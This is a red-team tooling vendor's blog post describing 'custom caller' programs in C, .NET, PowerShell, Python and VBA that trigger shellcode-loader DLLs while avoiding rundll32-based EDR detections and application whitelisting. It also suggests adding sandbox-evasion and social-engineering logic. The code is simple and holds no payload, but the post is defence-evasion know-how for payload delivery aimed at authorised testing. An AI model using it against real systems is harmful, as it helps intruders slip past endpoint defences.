# https://bytecloak.nl/blog/dialing-dlls-opsec-friendly-dll-execution-through-custom-callers/

![Page illustration](https://bytecloak.nl/images/page-illustration.svg)

![Blurred shape](https://bytecloak.nl/images/blurred-shape-gray.svg)

![Blurred shape](https://bytecloak.nl/images/blurred-shape.svg)

![Dialing DLLs: OPSEC-friendly DLL execution through custom callers](https://bytecloak.nl/images/post-image-03.png)

Dynamic Link Library (DLL) files are a great format for payload loaders, as they are generally less scrutinized than executable (EXE) files. The downside is that they cannot be executed on their own. The traditional way of executing a shellcode loader contained in a DLL was to use the living-off-the-land binary (LOLBIN) `rundll32.exe`. This method is not stealthy. Modern endpoint detection and response (EDR) solutions often scrutinize libraries loaded by `rundll32.exe` at the same level as executables, defeating the purpose of using a library in the first place. Alerts may also be generated simply due to the use of `rundll32.exe`.

One way to execute DLLs in a relatively stealthy manner is through DLL hijacking. Much has been written about this technique, for example [here](https://pentestlab.blog/2017/03/27/dll-hijacking/), [here](https://liberty-shell.com/sec/2019/03/12/dll-hijacking/), and [here](https://itm4n.github.io/windows-dll-hijacking-clarified/). While hijacking provides the advantage of running a payload inside the process of a trusted executable, it still relies on an exploitation technique that can be detected and may negatively impact OPSEC. Furthermore, finding executables that are vulnerable to DLL hijacking can be time-consuming, and you may not want to expose your preferred hijacks in every situation.

Fortunately, there is an easy and benign way to trigger loaders in DLL files: simply call them. Libraries can be packaged with any executable file format that supports calling external functions from a DLL. These files are quick and easy to create, as they contain very little functionality. Moreover, this behavior is entirely benign, as calling functions from a DLL is its intended purpose.

While this concept is not groundbreaking, this post serves as a reminder for those who may occasionally overcomplicate their operations.

## Generating the library

Before creating the custom caller, we first need to generate the loader DLL. Open the ByteCloak Portal and create a new artifact. Set the output format to Dynamic Link Library. These techniques work with payload execution from `DllMain` as well as execution through payload trigger functions. For this example, we opt for the latter.

For simplicity, we add a single function export and configure it as our trigger function. In practice, it is preferable to define multiple exports to make the library appear more realistic. The screenshot below shows the configuration options used for the output format section.

![Output format configuration in the ByteCloak Portal](https://bytecloak.nl/images/blog-003-image-01.png)Output format configuration in the ByteCloak Portal

## Creating a custom caller

### Native caller

A native caller can be implemented in any language that is compiled and linked into an executable. In this example, we use the C programming language. There are two ways to load and trigger the loader DLL from a native caller: run-time loading and compile-time linking.

A caller that implements run-time loading is functionally equivalent to `rundll32.exe`, but it evades basic detections that rely on monitoring the use of the `rundll32.exe` binary. An example implementation is shown below:

```
// caller.c
#include <windows.h>

typedef void (__stdcall *PFN_MyTrigger)(void);

int main() {
    HMODULE         hMyLibrary;
    PFN_MyTrigger   pMyTrigger;

    hMyLibrary = LoadLibrary("MyLibrary.dll");
    if (hMyLibrary == NULL)
        return 1;

    pMyTrigger = (PFN_MyTrigger)GetProcAddress(hMyLibrary, "MyTrigger");
    if (pMyTrigger == NULL)
        return 1;

    pMyTrigger();
    return 0;
}
```

This program performs the following steps:

1. Uses `LoadLibrary` to load the loader DLL into the process address space.
2. Uses `GetProcAddress` to retrieve the address of the trigger function.
3. Calls the trigger function to initiate payload execution.

To build the program, execute the following command in a Visual Studio command prompt:

```
cl caller.c
```

An example of a native caller that uses compile-time linking is shown below:

```
// caller.c
int main() {
	MyTrigger();
	return 0;
}
```

This program directly calls the trigger function from the loader DLL. From a code perspective, this approach is much simpler. However, additional steps are required to build the program successfully. If we attempt to build it in the same way as before, the linker will fail because it does not understand how the loader DLL is structured.

To resolve this, we first create a module definition (.def) file that defines the exported functions:

```
// MyLibrary.def
LIBRARY   MyLibrary
EXPORTS
   MyTrigger   @1
```

This definition file can be compiled into a library (.lib) file using the following command:

```
lib /def:MyLibrary.def /out:MyLibrary.lib /machine:x64
```

We can now build the caller executable:

```
cl caller.c MyLibrary.lib
```

The resulting executable has the trigger function from the library added to its import address table. As a result, the Windows loader will automatically load the DLL into the process address space and resolve the function address during process initialization.

### .NET caller

.NET assemblies are an excellent option for custom callers, especially when running .NET post-exploitation tools. When combined with a loader that injects the payload into the current process, the payload runs in a process where the .NET runtime has been loaded in the standard manner. This helps evade detections that attempt to identify post-exploitation tools based on .NET execution in native processes.

A minimal .NET caller may look like the following:

```
// Caller.cs
using System;
using System.Runtime.InteropServices;

class Caller
{
    [DllImport("MyLibrary.dll", CallingConvention = CallingConvention.StdCall)]
    internal static extern void MyTrigger();

    static void Main()
    {
        MyTrigger();
    }
}
```

This program can be built using the following command:

```
csc Caller.cs
```

### Scripting engines

Application whitelisting solutions may prevent the execution of unknown executables. Depending on the whitelist configuration, payload execution may still be possible through LOLBINs such as scripting engines. Developing evasive shellcode loaders in multiple scripting languages is time-consuming, but writing scripts that simply call a function from a DLL is not.

One important consideration when writing callers in a scripting language is the DLL search order. The first two callers were able to locate the DLL because the directory of the process executable is included in the search order. For scripts, however, the directory of the scripting engine is included, not the directory of the script itself. As a result, a DLL located in the same directory as the script is not automatically discovered by the Windows loader. This means that either the DLL must be placed in a directory that is part of the search order, or the script must specify the full path to the DLL.

Another caveat is that the DLL is loaded into the address space of the scripting engine, which means the bitness of the DLL must match that of the engine. In most cases, a 64-bit implementation is sufficient. However, for maximum compatibility, it is possible to include both 32-bit and 64-bit libraries and allow the script to select the appropriate one.

Below are examples of DLL callers implemented in three different scripting languages. For simplicity, these examples assume 64-bit scripting engines.

#### PowerShell caller

PowerShell is built on top of .NET and supports direct execution of .NET code. The example below leverages this capability to call the payload trigger function:

```
# caller.ps1
$dllPath = Join-Path $PSScriptRoot "MyLibrary.dll"

Add-Type @"
using System.Runtime.InteropServices;

public static class Native
{
    [DllImport(@"$dllPath", CallingConvention = CallingConvention.StdCall)]
    public static extern void MyTrigger();
}
"@

[Native]::MyTrigger()
```

#### Python caller

The default Python installation includes the `ctypes` package, which provides support for calling functions from DLL files. The following example demonstrates how this can be used to trigger the payload:

```
# caller.py
import os
import ctypes

script_dir = os.path.dirname(os.path.abspath(__file__))
dll = ctypes.WinDLL(os.path.join(script_dir, "MyLibrary.dll"))

MyTrigger = dll.MyTrigger
MyTrigger.argtypes = []
MyTrigger.restype = None

MyTrigger()
```

#### VBA caller

Visual Basic for Applications (VBA) is the scripting language behind Office macros. While macros may not be the first mechanism you expect to work on systems with application whitelisting, VBA is also supported by various other applications, such as:

- SolidWorks (3D modeling)
- CATIA (3D modeling)
- ArcGIS (maps and geoprocessing)
- CorelDraw (graphic design)
- QuickBooks (accounting)

VBA includes built-in functionality for calling functions from DLLs. However, because VBA code is compiled into a binary format, import statements cannot rely on run-time calculation of the library location. There are several ways to address this. The first option is to use a relative path and accept its usage limitations:

```
Option Explicit

Declare PtrSafe Sub MyTrigger Lib "MyLibrary.dll" ()

Public Sub CallMyTrigger()
    MyTrigger
End Sub
```

This script can only be used after the loader DLL has been placed in a directory that is included in the DLL search order. Alternatively, a full path can be specified in the declaration:

```
Declare PtrSafe Sub MyTrigger Lib "C:\Full\Path\To\MyLibrary.dll" ()
```

This provides more flexibility in terms of library location, but still requires the file to be placed at a fixed path. If this is not an option, the DLL can be loaded at run time using `LoadLibrary`:

```
Option Explicit

    Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" _
        (ByVal lpLibFileName As String) As LongPtr
    Declare PtrSafe Sub MyTrigger Lib "MyLibrary.dll" ()

Public Sub CallMyTrigger()
    Dim dllPath As String
    dllPath = ActiveDocument.Path & "\MyLibrary.dll"

    If LoadLibraryA(dllPath) = 0 Then
        Exit Sub
    End If

    MyTrigger
End Sub
```

While this approach is the most convenient from an operator perspective, it may also attract additional scrutiny from EDR products. As always, the best solution depends on your specific requirements.

## Additional functionality

Caller files also provide an opportunity to add functionality before, after, or during payload execution. This can be leveraged to include social engineering techniques, guardrails, or sandbox evasion logic if the built-in options in ByteCloak do not meet the unique requirements of an operation. Examples include:

- Rendering a complex graphical user interface window
- Requesting user input and using that input to perform an action
- Verifying that an intranet page is accessible from the current system before payload execution
- Verifying that a trust relationship exists between the current user’s domain and a target domain before payload execution

## Conclusion

Custom callers can be used to trigger shellcode loaders in DLL files in an OPSEC-safe manner. They are easy to develop, offer significant flexibility in terms of file formats, and allow additional functionality to be added to otherwise closed-source loaders.

![Page illustration](https://bytecloak.nl/images/page-illustration.svg)

![Blurred shape](https://bytecloak.nl/images/blurred-shape-gray.svg)

![Blurred shape](https://bytecloak.nl/images/blurred-shape.svg)

![Blurred shape](https://bytecloak.nl/_next/static/media/blurred-shape.b85797ad.svg)

## Take your red team to the next level

[Request Quote->](https://bytecloak.nl/contact/request-quote)

[Request Trial](https://bytecloak.nl/contact/request-trial)